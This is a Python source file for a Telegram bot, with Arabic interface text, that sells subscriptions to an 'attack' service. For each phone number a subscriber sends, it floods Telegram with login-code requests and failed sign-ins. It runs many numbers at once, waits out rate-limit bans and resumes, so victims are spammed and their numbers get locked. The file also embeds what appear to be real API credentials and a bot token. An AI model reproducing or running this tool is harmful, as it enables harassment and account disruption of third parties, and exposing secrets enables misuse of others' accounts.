import os
import asyncio
import json
import logging
import time
from collections import defaultdict
import phonenumbers
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    FloodWaitError,
    SessionPasswordNeededError
)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = 37717383
API_HASH = "32331c1b9578374921b67792e5eda886"
TOKEN = "8701453769:AAFIS_b_sx3x7rawEYS_rtK90AGZoK8ZxRo"

# Define Admins and Developer link (replace with actual IDs/usernames)
ADMINS = [6876315705,6831264078]  # Replace with real admin IDs
DEVELOPER_LINK = "https://t.me/B_1_C"  # Replace with your developer Telegram link

# Attack settings
MAX_CONCURRENT_ATTACKS = 50
MAX_ATTEMPTS = 1000
ATTACK_DELAY = 0.1  # Delay between each attack iteration (0.1 ثانية)
attack_semaphore = asyncio.Semaphore(MAX_CONCURRENT_ATTACKS)

stats_file = 'stats.json'

def load_stats():
    if os.path.exists(stats_file):
        try:
            with open(stats_file, 'r') as f:
                data = json.load(f)
                if not isinstance(data.get('banned_numbers'), dict):
                    data['banned_numbers'] = {}
                if isinstance(data.get('user_chats'), list):
                    data['user_chats'] = set(data['user_chats'])
                else:
                    data['user_chats'] = set()
                if not isinstance(data.get('subscriptions'), dict):
                    data['subscriptions'] = {}
                if 'auto_attacked_count' not in data:
                    data['auto_attacked_count'] = 0
                return data
        except Exception as e:
            logger.error("Error loading stats: %s", e)
    return {
        'total_users': 0,
        'banned_numbers': {},
        'user_chats': set(),
        'subscriptions': {},
        'auto_attacked_count': 0
    }

stats = load_stats()

def save_stats():
    data = {
        'total_users': len(stats['user_chats']),
        'banned_numbers': stats['banned_numbers'],
        'user_chats': list(stats['user_chats']),
        'subscriptions': stats['subscriptions'],
        'auto_attacked_count': stats.get('auto_attacked_count', 0)
    }
    try:
        with open(stats_file, 'w') as f:
            json.dump(data, f)
    except Exception as e:
        logger.error("Error saving stats: %s", e)

def format_duration(seconds):
    seconds = int(seconds)
    periods = [
        ('يوم', 86400),
        ('ساعة', 3600),
        ('دقيقة', 60),
        ('ثانية', 1)
    ]
    result = []
    for name, period in periods:
        value, seconds = divmod(seconds, period)
        if value:
            result.append(f"{value} {name}")
    return '، '.join(result)

def check_subscription(user_id):
    current_time = time.time()
    if user_id in ADMINS:
        return True
    expiry = stats['subscriptions'].get(str(user_id))
    if expiry and expiry > current_time:
        return True
    return False

def is_valid_phone(phone):
    try:
        pn = phonenumbers.parse(phone, None)
        return phonenumbers.is_possible_number(pn) and phonenumbers.is_valid_number(pn)
    except Exception:
        return False

client = TelegramClient('spam_bot', API_ID, API_HASH).start(bot_token=TOKEN)

active_attacks = defaultdict(set)  # {chat_id: set(phone_numbers)}
pending_admin_actions = {}  # {admin_id: {"action": "activate" or "remove"}}

#------------------- Flood Attack Functionality -------------------#

async def flood_attack(phone, event):
    chat_id = event.chat_id
    try:
        msg = await event.respond(f"⚡ بدء الهجوم على الرقم: {phone}")
    except Exception as e:
        logger.error("Error sending start message: %s", e)
        return

    attempts = 0
    try:
        async with attack_semaphore:
            while phone in active_attacks[chat_id] and attempts < MAX_ATTEMPTS:
                try:
                    temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
                    await temp_client.connect()
                    try:
                        await temp_client.send_code_request(phone)
                    except FloodWaitError as e:
                        ban_time = e.seconds
                        ban_expires = time.time() + ban_time
                        stats['banned_numbers'][phone] = ban_expires
                        save_stats()
                        await event.respond(
                            f"⛔ تم حظر الرقم {phone}\n⏳ مدة الحظر: {format_duration(ban_time)}"
                        )
                        if ban_time < 7200:
                            await asyncio.sleep(ban_time)
                            await event.respond(f"✅ انتهت مدة حظر الرقم {phone}. بدء الهجوم الآن.")
                            continue
                        else:
                            break
                    attempts += 1
                    try:
                        await msg.edit(
                            f"📱 الهجوم على: {phone}\n"
                            f"🔥 المحاولات: {attempts}/{MAX_ATTEMPTS}"
                        )
                    except Exception as e:
                        logger.error("Error editing message: %s", e)
                    try:
                        await temp_client.sign_in(phone, code='00000')
                    except (PhoneCodeInvalidError, PhoneNumberInvalidError, SessionPasswordNeededError):
                        pass
                    except FloodWaitError as e:
                        ban_time = e.seconds
                        ban_expires = time.time() + ban_time
                        stats['banned_numbers'][phone] = ban_expires
                        save_stats()
                        await event.respond(
                            f"⛔ تم حظر الرقم {phone}\n⏳ مدة الحظر: {format_duration(ban_time)}"
                        )
                        if ban_time < 7200:
                            await asyncio.sleep(ban_time)
                            await event.respond(f"✅ انتهت مدة حظر الرقم {phone}. بدء الهجوم الآن.")
                            continue
                        else:
                            break
                    except Exception as e:
                        logger.error("Error during sign in for %s: %s", phone, e)
                        break
                except FloodWaitError as e:
                    ban_time = e.seconds
                    ban_expires = time.time() + ban_time
                    stats['banned_numbers'][phone] = ban_expires
                    save_stats()
                    await event.respond(
                        f"⛔ تم حظر الرقم {phone}\n⏳ مدة الحظر: {format_duration(ban_time)}"
                    )
                    if ban_time < 7200:
                        await asyncio.sleep(ban_time)
                        await event.respond(f"✅ انتهت مدة حظر الرقم {phone}. بدء الهجوم الآن.")
                        continue
                    else:
                        break
                except Exception as e:
                    logger.error("Error in attack loop for %s: %s", phone, e)
                    break
                finally:
                    try:
                        await temp_client.disconnect()
                    except Exception as e:
                        logger.error("Error disconnecting temp_client: %s", e)
                await asyncio.sleep(ATTACK_DELAY)
    except asyncio.CancelledError:
        logger.info("Attack on %s was cancelled", phone)
    finally:
        if phone in active_attacks[chat_id]:
            active_attacks[chat_id].remove(phone)
        try:
            await msg.edit(f"✅ انتهى الهجوم على: {phone}\n🔄 مجموع المحاولات: {attempts}")
        except Exception as e:
            logger.error("Error finalizing message for %s: %s", phone, e)

#------------------- Command Handlers -------------------#

@client.on(events.NewMessage(pattern='/start'))
async def welcome_handler(event):
    user_id = event.sender_id
    chat_id = event.chat_id
    if chat_id not in stats['user_chats']:
        stats['user_chats'].add(chat_id)
        save_stats()
    current_time = time.time()
    total_users = len(stats['user_chats'])
    banned_count = len(stats['banned_numbers'])
    banned_less_than_two = sum(1 for t in stats['banned_numbers'].values() if 0 < t - current_time < 7200)
    auto_attacked_count = stats.get('auto_attacked_count', 0)
    
    stats_text = (
         f"👥 عدد مستخدمي البوت: {total_users}\n"
         f"⛔ عدد الأرقام المحظورة: {banned_count}\n"
         f"⏳ الأرقام المحظورة أقل من ساعتين: {banned_less_than_two}\n"
         f"🚀 الأرقام التي تم الهجوم عليها تلقائياً: {auto_attacked_count}\n"
    )
    if user_id in ADMINS:
        message = f"👋 أهلاً يا أدمن.\n\n{stats_text}\nاضغط على زر لوحة الادمن للدخول إلى أوامر الإدارة."
        buttons = [Button.inline("لوحة الادمن", b"admin_panel"), Button.inline("الهجوم التلقائي", b"auto_attack_panel")]
        await event.respond(message, buttons=buttons)
    else:
        if not check_subscription(user_id):
            message = "❌ لا يوجد لديك اشتراك مفعل.\nيرجى مراسلة المطور وطلب تفعيل الاشتراك."
            buttons = [Button.url("📞 تواصل مع المطور", DEVELOPER_LINK)]
            await event.respond(message, buttons=buttons)
        else:
            expiry = stats['subscriptions'].get(str(user_id))
            remaining = expiry - time.time() if expiry and expiry > time.time() else 0
            message = (
                f"✅ اشتراكك ساري حتى: {time.ctime(expiry)}\n"
                f"⏳ المتبقي: {format_duration(remaining)}\n\n"
                f"{stats_text}"
            )
            buttons = [Button.url("📞 تواصل مع المطور", DEVELOPER_LINK), Button.inline("الهجوم التلقائي", b"auto_attack_panel")]
            await event.respond(message, buttons=buttons)

@client.on(events.NewMessage(pattern='/stats'))
async def stats_handler(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    current_time = time.time()
    sub_info = "❌ غير مفعل"
    expiry = stats['subscriptions'].get(str(user_id))
    if expiry and expiry > current_time:
        remaining = expiry - current_time
        sub_info = f"✅ حتى: {time.ctime(expiry)}\n⏳ المتبقي: {format_duration(remaining)}"
    banned_less_than_two = sum(1 for t in stats['banned_numbers'].values() if 0 < t - current_time < 7200)
    auto_attacked_count = stats.get('auto_attacked_count', 0)
    user_stats = (
        f"📊 إحصائيات البوت:\n"
        f"👥 إجمالي المستخدمين: {len(stats['user_chats'])}\n"
        f"⛔ الأرقام المحظورة: {len(stats['banned_numbers'])}\n"
        f"⏳ الأرقام المحظورة أقل من ساعتين: {banned_less_than_two}\n"
        f"🚀 الأرقام التي تم الهجوم عليها تلقائياً: {auto_attacked_count}\n"
        f"🔥 الهجمات الجارية في دردشتك: {len(active_attacks[chat_id])}\n\n"
        f"💳 حالة الاشتراك: {sub_info}"
    )
    await event.respond(user_stats)

@client.on(events.NewMessage(pattern='/stop'))
async def stop_handler(event):
    chat_id = event.chat_id
    count = len(active_attacks[chat_id])
    active_attacks[chat_id].clear()
    await event.respond(f"⏹ تم إيقاف {count} هجوم")

@client.on(events.NewMessage(pattern='/banlist'))
async def banlist_handler(event):
    current_time = time.time()
    if stats['banned_numbers']:
        msg = "📋 قائمة الأرقام المحظورة:\n"
        for phone, expiry in stats['banned_numbers'].items():
            remaining = expiry - current_time
            if remaining > 0:
                msg += f"{phone} - ⏳ {format_duration(remaining)}\n"
        await event.respond(msg)
    else:
        await event.respond("✅ لا توجد أرقام محظورة حالياً.")

@client.on(events.NewMessage(pattern='/help'))
async def help_handler(event):
    help_text = (
        "📖 تعليمات البوت:\n"
        "/start - بدء البوت وعرض الإحصائيات\n"
        "/stats - عرض إحصائيات البوت\n"
        "/stop - إيقاف الهجمات الجارية في الدردشة\n"
        "/banlist - عرض قائمة الأرقام المحظورة\n\n"
        "يمكن للمشتركين النشطين إرسال أرقام للهجوم مباشرة عن طريق إرسال الرقم في رسالة.\n"
        "الأرقام المحظورة أقل من ساعتين ستظهر في زر 'الهجوم التلقائي'."
    )
    await event.respond(help_text)

@client.on(events.NewMessage)
async def auto_attack_handler(event):
    if event.text.startswith('/'):
        return
    user_id = event.sender_id
    chat_id = event.chat_id
    if not check_subscription(user_id):
        buttons = [Button.url("📞 تواصل مع المطور", DEVELOPER_LINK)]
        await event.respond("❌ لا يوجد لديك اشتراك مفعل. يرجى مراسلة المطور لتفعيل الاشتراك.", buttons=buttons)
        return
    if chat_id not in stats['user_chats']:
        stats['user_chats'].add(chat_id)
        save_stats()
    current_time = time.time()
    invalid_phones = []
    valid_phones = []
    duplicate_numbers = []
    banned_numbers_list = []
    for line in event.text.split('\n'):
        line = line.strip().replace("+", "").replace(" ", "")
        if line.isdigit() and len(line) > 6:
            phone = f"+{line}"
            if not is_valid_phone(phone):
                invalid_phones.append(phone)
                continue
            if phone in stats['banned_numbers']:
                ban_expires = stats['banned_numbers'][phone]
                remaining = ban_expires - current_time
                if remaining > 7200:
                    banned_numbers_list.append(f"{phone}\n⏳ مدة الحظر: {format_duration(remaining)}")
                    continue
                # الأرقام المحظورة أقل من ساعتين ستتعامل معها عبر زر الهجوم التلقائي
                continue
            if phone in active_attacks[chat_id]:
                duplicate_numbers.append(phone)
            else:
                valid_phones.append(phone)
    response_messages = []
    if invalid_phones:
        response_messages.append("❌ الأرقام التالية غير صالحة:\n" + "\n".join(invalid_phones))
    if banned_numbers_list:
        response_messages.append("❗ الأرقام التالية محظورة لأكثر من ساعتين:\n" + "\n".join(banned_numbers_list))
    if duplicate_numbers:
        response_messages.append("❗ الأرقام التالية قيد الهجوم بالفعل:\n" + "\n".join(duplicate_numbers))
    if valid_phones:
        for phone in valid_phones:
            active_attacks[chat_id].add(phone)
            asyncio.create_task(flood_attack(phone, event))
        response_messages.append(f"🎯 بدء الهجوم على {len(valid_phones)} رقم!")
    auto_candidates = []
    for phone, ban_expires in stats['banned_numbers'].items():
        remaining = ban_expires - current_time
        if 0 < remaining <= 7200:
            auto_candidates.append(f"{phone} - ⏳ {format_duration(remaining)}")
    if auto_candidates:
        response_messages.append("🕒 الأرقام التالية مؤهلة للهجوم التلقائي:\n" + "\n".join(auto_candidates) + "\nاضغط على زر الهجوم التلقائي.")
        await event.respond("\n\n".join(response_messages), buttons=Button.inline("الهجوم التلقائي", b"auto_attack_panel"))
    elif response_messages:
        await event.respond("\n\n".join(response_messages))

#------------------- Callback Query Handlers -------------------#

@client.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    data = event.data
    if data == b"admin_panel":
        if user_id in ADMINS:
            buttons = [
                [Button.inline("تفعيل اشتراك", b"activate_sub")],
                [Button.inline("إلغاء اشتراك", b"remove_sub")]
            ]
            await event.edit("🔧 أوامر إدارة الاشتراكات:", buttons=buttons)
        else:
            await event.answer("🚫 ليس لديك صلاحية.", alert=True)
    elif data == b"auto_attack_panel":
        current_time = time.time()
        candidates = []
        for phone, ban_expires in stats['banned_numbers'].items():
            remaining = ban_expires - current_time
            if 0 < remaining <= 7200:
                candidates.append((phone, remaining))
        if not candidates:
            await event.answer("لا يوجد أرقام مؤهلة للهجوم التلقائي.", alert=True)
            return
        msg = "📋 الأرقام المؤهلة للهجوم التلقائي:\n"
        for phone, remaining in candidates:
            msg += f"{phone} - ⏳ {format_duration(remaining)}\n"
        buttons = [Button.inline("ابدأ الهجوم على الكل", b"start_auto_attack")]
        await event.edit(msg, buttons=buttons)
    elif data == b"start_auto_attack":
        current_time = time.time()
        candidates = []
        for phone, ban_expires in stats['banned_numbers'].items():
            remaining = ban_expires - current_time
            if 0 < remaining <= 7200:
                candidates.append((phone, remaining))
        if not candidates:
            await event.answer("لا يوجد أرقام مؤهلة للهجوم التلقائي.", alert=True)
            return
        for phone, remaining in candidates:
            if phone not in active_attacks[event.chat_id]:
                active_attacks[event.chat_id].add(phone)
                asyncio.create_task(flood_attack(phone, event))
                stats['auto_attacked_count'] = stats.get('auto_attacked_count', 0) + 1
        save_stats()
        await event.edit("✅ تم بدء الهجوم التلقائي على جميع الأرقام المؤهلة.")
    elif user_id not in ADMINS:
        await event.answer("🚫 ليس لديك صلاحية.", alert=True)
    elif data == b"activate_sub":
        pending_admin_actions[user_id] = {"action": "activate"}
        await event.edit("✍️ يرجى إرسال رسالة تحتوي على:\n`<user_id> <عدد الأيام>`\nمثال: `987654321 30`", parse_mode='md')
    elif data == b"remove_sub":
        pending_admin_actions[user_id] = {"action": "remove"}
        await event.edit("✍️ يرجى إرسال ايدي المستخدم لإلغاء الاشتراك.\nمثال: `987654321`")
    else:
        await event.answer("❓ أمر غير معروف.")

@client.on(events.NewMessage)
async def admin_subscription_input(event):
    user_id = event.sender_id
    if user_id not in ADMINS:
        return
    if user_id not in pending_admin_actions:
        return
    action = pending_admin_actions[user_id]["action"]
    text = event.text.strip()
    if action == "activate":
        parts = text.split()
        if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
            await event.respond("❌ تنسيق خاطئ. يرجى إرسال: `<user_id> <عدد الأيام>`")
            return
        target_id = parts[0]
        days = int(parts[1])
        expiry = time.time() + days * 86400
        stats['subscriptions'][str(target_id)] = expiry
        save_stats()
        try:
            await client.send_message(int(target_id),
                f"✅ تم تفعيل اشتراكك لمدة {days} يوم.\n"
                f"⏳ ينتهي الاشتراك: {time.ctime(expiry)}"
            )
        except Exception as e:
            logger.error("Error notifying user %s: %s", target_id, e)
        await event.respond(f"✅ تم تفعيل الاشتراك للمستخدم {target_id} لمدة {days} يوم.")
    elif action == "remove":
        if not text.isdigit():
            await event.respond("❌ تنسيق خاطئ. يرجى إرسال: `<user_id>`")
            return
        target_id = text
        if str(target_id) in stats['subscriptions']:
            del stats['subscriptions'][str(target_id)]
            save_stats()
            try:
                await client.send_message(int(target_id), "🚫 تم إلغاء اشتراكك.")
            except Exception as e:
                logger.error("Error notifying user %s: %s", target_id, e)
            await event.respond(f"✅ تم إلغاء الاشتراك للمستخدم {target_id}.")
        else:
            await event.respond(f"❌ المستخدم {target_id} ليس لديه اشتراك مفعل.")
    pending_admin_actions.pop(user_id, None)

client.run_until_disconnected()
